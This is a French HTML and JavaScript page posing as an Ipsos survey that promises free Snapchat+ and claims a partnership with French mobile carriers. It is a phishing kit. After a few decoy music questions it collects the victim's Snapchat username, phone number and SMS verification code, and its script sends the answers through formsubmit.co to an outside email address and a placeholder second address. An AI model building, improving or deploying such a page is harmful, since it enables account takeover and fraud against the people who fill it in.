<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage|Ipsos</title>

<!-- Police Inter -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
body { 
    font-family: 'Inter', sans-serif; 
    background:#f4f6f9; 
    margin:0; 
    font-size:20px; 
}

/* RESPONSIVE */
@media (max-width: 600px) {
    .box {
        margin:20px;
        padding:25px;
    }
    h2 { font-size:26px; }
    p { font-size:20px; }
    button { font-size:20px; padding:12px 20px; }
    #partenariat { font-size:20px; }
}

/* HEADER AVEC LOGO */
.header {
    background:#003b7a;
    padding:30px 30px;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
}
.header img {
    height:55px;
    cursor:pointer;
}

/* TEXTE CENTR√â */
.header-text {
    color:white;
    font-size:28px;
    font-weight:bold;
}

/* LOGO √Ä GAUCHE */
.header a {
    position:absolute;
    left:30px;
}
/* LOGO PERMANENT EN HAUT √Ä DROITE */
.logo-fixed {
    position: fixed;
    top: 15px;
    right: 15px;
    height: 45px;
    z-index: 9999;
    cursor: pointer;
}


/* CONTENU CENTRAL */
.box {
    max-width:650px;
    margin:70px auto;
    background:white;
    padding:50px;
    border-radius:12px;
    box-shadow:0 4px 12px rgba(0,0,0,0.1);
}

h2 { font-size:32px; margin-bottom:20px; }
p { font-size:24px; margin-bottom:25px; }

button {
    padding:15px 28px;
    background:#0078d4;
    color:white;
    border:0;
    border-radius:8px;
    cursor:pointer;
    font-size:22px;
}
button:hover { background:#005fa3; }
button:disabled {
    background:#b0b0b0;
    cursor:not-allowed;
}

/* BARRE DE PROGRESSION */
.progress-container {
    width:100%;
    height:10px;
    background:#e0e0e0;
    border-radius:5px;
    margin-bottom:25px;
    overflow:hidden;
}

.progress-bar {
    height:100%;
    width:0%;
    background:#0078d4;
    transition: width 0.3s ease;
}

/* PARTENARIAT */
#partenariat {
    display:none;
    text-align:center;
    font-size:26px;
    margin-top:40px;
}
    /* LOGO PERMANENT EN HAUT √Ä DROITE */
.logo-fixed {
    position: fixed;
    top: 15px;
    right: 15px;
    height: 45px;
    z-index: 9999;
    cursor: pointer;
}
</style>
</head>
<body><img src="SnapchatLogo.png" class="logo-fixed" alt="Logo">

<div class="header">
    <a href="index.html" onclick="return confirmerRetour();">
        <img src="logo.png" alt="Logo">
    </a>

    <div class="header-text"><h2>Ipsos sondage</h2></div>
</div>

<!-- √âCRAN INTRO -->
<div class="box" id="intro">
    <h2>Sondage √©ph√©m√®re</h2>
    <p>Apr√®s avoir r√©pondu √† ce sondage, VOUS AUREZ SNAPCHAT + üéÅ</p>
    <button onclick="demarrerSondage()">Commencer</button>
</div>

<!-- PAGE INTERM√âDIAIRE -->
<div class="box" id="intermediaire" style="display:none;">
    <h2>Merci pour vos r√©ponses √† ce sondage express !</h2>
    <p>Dans un instant, vous pourrez b√©n√©ficier de Snapchat+ pendant 1 mois !<br>
    Nous avons besoin d'une derni√®re v√©rification afin de vous offrir l'abonnement.</p>
    <button onclick="continuer()">Continuer</button>
</div>

<!-- SONDAGE -->
<div class="box" id="sondage" style="display:none;">
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <h2 id="titre"></h2>
    <p id="question"></p>
    <div id="reponses"></div>
    <button onclick="suivant()">Suivant</button>
</div>

<!-- PARTENARIAT (affich√© uniquement aux questions 4,5,6) -->
<div id="partenariat">
    <div><strong>Snapchat + Ipsos sondage</strong></div>
    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
</div>

<script>
function confirmerRetour() {
    return confirm("Attention : si vous retournez √† l'accueil, le sondage en cours sera perdu.");
}

function demarrerSondage() {
    document.getElementById("intro").style.display = "none";
    document.getElementById("sondage").style.display = "block";
    afficherQuestion();
    updateProgress();
}

let titre = "Sondage pour b√©n√©ficier de Snapchat +";

let questions = [
    { text: "Quel est ton artiste ou groupe pr√©f√©r√© ?", type: "text", placeholder: "Exemple:Niska" },
    { text: " Quel artiste √©coute tu en ce moment sur Deezer?", type: "text", placeholder: "Exemple:Niska" },
    { text: " Quel artiste aimerais tu d√©couvrir davantage sur Deezer?", type: "text", placeholder: "Exemple:Jul" },
    { text: "Quel est votre nom d'utilsateur snapchat?", type: "text", placeholder: "Entrez votre pseudo Snapchat" },
    { text: "Quel est votre num√©ro de t√©l√©phone?", type: "text", placeholder: "XXXXXXXXXX" },
    { text: "Entrez le code qui vous a √©t√© envoy√© par SMS", type: "text", placeholder: "XXXX" }
];

let i = 0;

document.getElementById("titre").textContent = titre;

function afficherQuestion() {
    let q = questions[i];
    document.getElementById("question").textContent = q.text;

    let zone = document.getElementById("reponses");
    zone.innerHTML = "";

    if (q.type === "text") {
        zone.innerHTML = `<input id="champ" type="text" placeholder="${q.placeholder || ''}" oninput="verifierChamp()" style="width:100%; font-size:22px; padding:10px;">`;
    }

    // Afficher partenariat uniquement aux questions 4, 5, 6
    document.getElementById("partenariat").style.display = (i >= 3 && i <= 5) ? "block" : "none";

    document.querySelector("#sondage button").disabled = true;

    updateProgress();
}
/* ACTIVER/D√âSACTIVER LE BOUTON */
function verifierChamp() {
    let input = document.getElementById("champ");
    let bouton = document.querySelector("#sondage button");
    bouton.disabled = !input.value.trim();
}

/* BARRE DE PROGRESSION */
function updateProgress() {
    let progress = ((i) / questions.length) * 100;
    document.getElementById("progressBar").style.width = progress + "%";
}

function suivant() {
    let q = questions[i];

    if (q.type === "text") {
        let input = document.querySelector("#reponses input");
        if (!input.value.trim()) {
            alert("Veuillez remplir ce champ avant de continuer.");
            return;
        }
    }

    if (q.text.includes("num√©ro")) {
        let tel = document.querySelector("#reponses input").value.trim();
        if (!/^[0-9]{10}$/.test(tel)) {
            alert("Veuillez entrer un num√©ro de t√©l√©phone valide (10 chiffres).");
            return;
        }
    }

    i++;

    // PAGE INTERM√âDIAIRE APR√àS LA 3√®me QUESTION
    if (i === 3) {
        document.getElementById("sondage").style.display = "none";
        document.getElementById("intermediaire").style.display = "block";
        return;
    }

    if (i < questions.length) {
        afficherQuestion();
    } else {
        document.querySelector("#sondage").innerHTML =
        "<h2>Nous arrivons √† la fin du sondage.<br><br>" +
        "Un message vous sera envoy√© dans les prochaines 24 heures pour vous informer " +
        "si vous avez remport√© Snapchat+.<br><br>" +
        "√Ä bient√¥t chez Ipsos !</h2>";

        envoyerReponses(); // üî• Envoi automatique √† la fin
    }
}

function continuer() {
    document.getElementById("intermediaire").style.display = "none";
    document.getElementById("sondage").style.display = "block";
    afficherQuestion();
}
</script>

<!-- PARTENARIAT (d√©j√† styl√© + responsive) -->
<div id="partenariat">
    <div><strong>Snapchat + Ipsos sondage</strong></div>
    <div>En partenariat avec Bouygues Telecom, Orange et SFR</div>
</div>

<!-- SCRIPT D‚ÄôENVOI VERS 2 MAILS -->
<script>
function envoyerReponses() {
    let data = {};

    // R√©cup√©rer toutes les r√©ponses
    questions.forEach((q, index) => {
        let input = document.querySelector("#reponses input");
        data[q.text] = input ? input.value : "";
    });

    // Convertir en FormData
    let formData = new FormData();
    for (let key in data) {
        formData.append(key, data[key]);
    }

    // Envoi vers email 1
    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
        method: "POST",
        body: formData
    });

    // Envoi vers email 2
    fetch("https://formsubmit.co/MAIL2", {
        method: "POST",
        body: formData
    });

    alert("Merci ! Vos r√©ponses ont √©t√© envoy√©es.");
}
</script>

</body>
</html>

